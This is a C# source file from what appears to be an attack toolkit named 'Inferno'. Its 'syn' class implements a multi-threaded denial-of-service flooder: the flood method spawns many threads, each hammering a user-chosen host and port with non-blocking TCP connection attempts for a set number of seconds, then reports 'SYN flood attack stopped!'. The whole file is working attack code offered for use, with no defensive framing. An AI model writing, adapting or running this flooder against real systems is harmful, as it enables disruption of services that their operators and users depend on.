using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace Inferno
{
    internal class syn
    {

        // Output
        private static dynamic output = new System.Dynamic.ExpandoObject();
        // Callback
        public static AsyncCallback callback = new AsyncCallback(OnConnect);
        // Threads list
        private static List<Thread> threadsList = new List<Thread>();

        // Send packet
        private static void send(string host, int seconds, int port = 80)
        {
            IPEndPoint IPEo;
            // host:port
            if (host.Contains(":"))
            {
                port = Int32.Parse(host.Split(':')[1]);
                host = host.Split(':')[0];
            }

            try {
                IPEo = new IPEndPoint(Dns.GetHostEntry(host).AddressList[0], port);
            } catch {
                IPEo = new IPEndPoint(IPAddress.Parse(host), port);
            }

            Socket bot = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            bot.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.DontLinger, true);
            bot.Blocking = false;

            DateTime d = DateTime.Now.AddSeconds(seconds);
            while (DateTime.Compare(DateTime.Now, d) < 0)
            {
                try { bot.BeginConnect(IPEo, callback, bot); }
                catch
                {
                    if (bot.Connected)
                    {
                        try { bot.Disconnect(true); }
                        catch { }
                    }
                }
                

            }
        }
        // DDOS
        public static void flood(string target, int threads, int seconds)
        {
        
            // Start threads
            for (int i = 0; i < threads; i++)
            {
                Thread thread = new Thread(() => send(target, seconds));
                thread.Start();
                threadsList.Add(thread);
            }

            // Wait for stop threads
            foreach (Thread thread in threadsList)
            {
                if (thread.IsAlive) { thread.Join(); }
            }

            // Show output
            output.target = target;
            output.threads = threads;
            output.seconds = seconds;
            core.Exit("SYN flood attack stopped!", output);
        }

        // Callback
        private static void OnConnect(IAsyncResult ar)
        {
            Socket bot = (Socket)ar.AsyncState;

            if (bot.Connected)
            {
                try { bot.Disconnect(true); }
                catch { }
            }
            GC.Collect();
        }

    }
}
